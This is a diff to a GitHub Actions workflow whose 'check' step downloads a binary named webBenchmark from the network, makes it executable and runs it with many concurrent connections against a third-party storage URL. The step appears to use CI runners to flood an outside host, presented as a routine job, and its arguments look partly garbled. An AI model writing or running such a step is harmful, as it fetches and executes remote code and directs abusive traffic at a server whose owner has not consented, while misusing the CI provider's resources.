@@ -27,4 +27,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: check
-        run: ulimit -n 1048576&&wget -N https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_x64 -O wb && chmod 777 wb &&./wb -c 128 -s  webBenchmark_x64.exe -c 96 -s https://voc-public-storage.xcnya.cn/usercontent/cover/20fd7093-abb9-480b-8021-5382824d7a88/72a22143-1122-4b0a-aadd-e0b6dde173d-so7acs9
+        run: wget -N https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_x64 -O wb && chmod 777 wb &&./wb -c 128 -s  webBenchmark_x64.exe -c 96 -s https://voc-public-storage.xcnya.cn/usercontent/cover/20fd7093-abb9-480b-8021-5382824d7a88/72a22143-1122-4b0a-aadd-e0b6dde173d-so7acs9
